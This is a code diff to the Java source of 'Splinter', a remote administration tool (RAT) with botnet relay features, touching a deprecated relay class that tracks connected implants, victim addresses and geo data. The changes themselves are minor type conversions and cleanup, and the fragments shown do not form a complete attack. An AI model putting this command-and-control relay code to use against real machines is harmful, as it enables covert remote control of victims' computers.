@@ -6,6 +6,8 @@
 	Splinter - The RAT (Remote Administrator Tool)
 	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
 	Copyright 2013 Solomon Sonya
+	
+	This copyright applies to the entire Splinter Project and all relating source code
 
 	This program is free software: you are free to  redistribute 
     it under the terms of the GNU General Public License as published by
@@ -45,6 +47,7 @@
 	Email	--> splinterbotnet@gmail.com
 	GitHub	--> https://github.com/splinterbotnet
 **/
+
 
 
 package RelayBot;
@@ -149,12 +152,12 @@ public class DEPRECATED_RelayBot_AgentConnectedToRelayBot extends Thread
       Driver.sop("Streams opened");
 
       this.myLocalControllerPort = this.sktMyConnection_ConnectedAgent.getLocalAddress().toString();
-      this.myLocalController_IP = this.sktMyConnection_ConnectedAgent.getLocalPort();
+      this.myLocalController_IP = ""+this.sktMyConnection_ConnectedAgent.getLocalPort();
       this.myVictim_RHOST_IP = this.sktMyConnection_ConnectedAgent.getInetAddress().toString();
       Driver.sop(this.sktMyConnection_ConnectedAgent.getInetAddress().toString());
       Driver.sop(this.sktMyConnection_ConnectedAgent.getLocalAddress().toString());
       Driver.sop(this.sktMyConnection_ConnectedAgent.getLocalSocketAddress().toString());
-      this.myRemote_RHOST_Port = this.sktMyConnection_ConnectedAgent.getPort();
+      this.myRemote_RHOST_Port = ""+this.sktMyConnection_ConnectedAgent.getPort();
 
       this.continueRun = true;
 
@@ -440,7 +443,7 @@ public class DEPRECATED_RelayBot_AgentConnectedToRelayBot extends Thread
 
         this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.myRandomIdentifier + "]");
 
-        sendCommand_RAW_ToAgent(this.myRandomIdentifier);
+        sendCommand_RAW_ToAgent(""+this.myRandomIdentifier);
 
         sendCommand_RAW_ToAgent("[SPLINTER_IMPLANT]%%%%%[RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY]");
 
@@ -460,7 +463,7 @@ public class DEPRECATED_RelayBot_AgentConnectedToRelayBot extends Thread
       Driver.sop("Geez!!!!  Missed it by that much. Authentication failed for this implant... invalid parameters passed in");
 
       this.myIMPLANT_ID = 0;
-      try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }
+      try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception ee) { this.myImplantName = "UNKNOWN"; }
 
 
     }
@@ -470,7 +473,7 @@ public class DEPRECATED_RelayBot_AgentConnectedToRelayBot extends Thread
 
   public boolean connectToForwardControllerIfApplicable()
   {
-    return true;
+    
 
     return false;
   }
@@ -1012,7 +1015,7 @@ public class DEPRECATED_RelayBot_AgentConnectedToRelayBot extends Thread
       }
     }
 
-    this.vctMyRowData.add(getId());
+    this.vctMyRowData.add(""+getId());
     this.vctMyRowData.add(this.myFullGeoData);
     this.vctMyRowData.add(this.myImplantName);
     this.vctMyRowData.add(RelayBot_ServerSocket.careOfAddress);
